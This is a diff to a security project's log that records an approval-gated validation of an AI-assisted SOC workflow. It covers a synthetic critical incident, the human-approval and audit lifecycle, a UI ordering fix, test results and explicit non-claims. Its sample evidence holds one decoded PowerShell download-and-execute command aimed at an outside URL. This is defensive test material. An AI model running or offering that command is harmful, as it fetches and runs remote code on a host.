@@ -2921,6 +2921,98 @@ In the initial post-Milestone-13 planning, the SOC Analyst UI was projected as M
   - Jira ticket creation may occur before approval and has zero response authority.
   - Pre-approval audit excludes approval-grant/consume/completion events until the analyst acts.
 
+#### Integrated Deferred Approval Validation — 2026-10-13
+- **Validation Classification**: **IMPLEMENTED + TESTED OFFLINE / MANUALLY BROWSER VALIDATED**
+
+##### Controlled Synthetic Scenario & Evidence
+- **Incident ID**: `INC-DEMO-CRIT-20261013-001`
+- **Evidence Source**: Sanitized Local Synthetic Fixture
+- **Detection ID**: `DET-POWERSHELL-001`
+- **Detection Name**: `suspicious encoded powershell execution`
+- **MITRE ATT&CK Mapping**: `T1059.001` (Command and Scripting Interpreter: PowerShell)
+- **Target Host**: `DC01`
+- **Target User**: `SYSTEM`
+- **Decoded Command**: `IEX (New-Object Net.WebClient).DownloadString("http://8.8.8.8/s")`
+- **Safety Boundary**: This was synthetic evidence only and was not executed as real malicious activity.
+
+##### Deterministic Policy Result
+- **Risk Score**: `80 / 100`
+- **Risk Level**: `CRITICAL`
+- **Disposition**: `APPROVAL_REQUIRED`
+- **Proposed Action**: `simulate_endpoint_isolation`
+- **Requires Human Approval**: `true`
+- **Initial Approval State**: `PENDING`
+- **Initial Simulation Status**: `NOT_EXECUTED`
+- **Initial Simulation Detail Code**: `simulation_deferred_pending_approval`
+
+##### Pre-Approval Validation
+- `IncidentRecord` persisted with `PENDING` state.
+- Audit trail ended at `APPROVAL_REQUIRED`.
+- No `APPROVAL_GRANTED` event existed.
+- No `APPROVAL_CONSUMED` event existed.
+- No `SIMULATION_COMPLETED` event existed.
+- Approval consumption ledger contained no entry for this incident.
+- No endpoint action occurred.
+
+##### Manual Analyst Approval
+- The SOC Analyst UI was accessed from Kali against the Splunk-Server UI.
+- UI showed `CRITICAL / 80`.
+- UI showed `APPROVAL_REQUIRED`.
+- UI showed proposed action `simulate_endpoint_isolation`.
+- UI showed `REQUIRED / PENDING`.
+- UI explicitly stated real endpoint isolation was `NOT IMPLEMENTED`.
+- Analyst clicked "Approve simulated action" exactly once.
+
+##### Post-Approval Result
+- **Approval Status**: `APPROVED`
+- **Approval Reason Code**: `approval_granted`
+- **Simulation Status**: `SIMULATED`
+- **Simulation Detail Code**: `simulated_endpoint_isolation`
+- Real endpoint containment remained `NOT IMPLEMENTED`.
+
+##### Approval Consumption Ledger
+Exactly one consumption record was persisted for:
+- **Incident ID**: `INC-DEMO-CRIT-20261013-001`
+- **Proposed Action**: `simulate_endpoint_isolation`
+- **Approval ID**: `APP-INC-DEMO-CRIT-20261013-001-SIMULATE_ENDPOINT_ISOLAT`
+
+##### Audit Lifecycle After Approval
+- `APPROVAL_REQUESTED`
+- `APPROVAL_GRANTED`
+- `APPROVAL_CONSUMED`
+- `SIMULATION_COMPLETED`
+
+##### Sequence-Number Clarification & Presentation Defect Resolution
+- **Batch-Local Sequence Numbers**: Investigation and approval actions were emitted by separate `AuditLog` batches. Sequence numbers are batch-local and are **NOT** globally unique across the full incident lifetime. The investigation batch used sequence `0–11`; the approval batch reused sequence `0–3`.
+- **Defect Found During Validation**: The persisted JSONL append order was already correct on disk. However, the UI previously sorted by sequence and therefore interleaved the two batches incorrectly. `APPROVAL_CONSUMED` was also categorized as `UNKNOWN / OTHER`.
+- **Engineering Fix (Commit `b3c5a3c`)**:
+  - `AuditReader` now preserves physical append order from the append-only JSONL audit log.
+  - Original batch-local sequence values remain visible in badges (`#{ev.sequence}`) for evidence/debug display but are not used as global chronology.
+  - `APPROVAL_CONSUMED` and other approval lifecycle events are categorized as `APPROVAL`.
+  - Security-control execution logic was not changed.
+- **Regression Verification**:
+  - Focused audit timeline suite: 32 tests PASS.
+  - Complete UI test suites: 229 tests PASS.
+  - Canonical full offline suite: 1825/1825 PASS.
+  - Manual browser regression validation confirmed:
+    `APPROVAL_REQUIRED` → `APPROVAL_REQUESTED` → `APPROVAL_GRANTED` → `APPROVAL_CONSUMED` → `SIMULATION_COMPLETED` in correct append/lifecycle order.
+
+##### Security Conclusion
+This validation proves the implemented bounded consequential-action path:
+> `AI proposes → deterministic policy requires approval → incident remains PENDING and NOT_EXECUTED → analyst explicitly approves → approval is persistently consumed exactly once → only the permitted simulated action runs → everything is audited.`
+
+##### Explicit Truthfulness & Non-Claims
+- This was a sanitized synthetic scenario.
+- It was **NOT** a live malicious attack.
+- Endpoint isolation was **SIMULATED** only.
+- No real endpoint isolation occurred.
+- No account was disabled.
+- No firewall rule was changed.
+- No credential was changed.
+- No destructive action occurred.
+- Real containment remains **NOT IMPLEMENTED**.
+- Multi-threaded, multi-process, and cross-host atomic approval consumption are **NOT CLAIMED**.
+
 - **Boundary Constraint**:
   - **AI proposes → deterministic policy evaluates → human approves consequential actions → only permitted simulated response executes → everything is logged and evaluated.**
   - Endpoint isolation, account disabling, firewall changes, destructive actions, credential changes, and other real high-impact response actions remain **NOT IMPLEMENTED**.
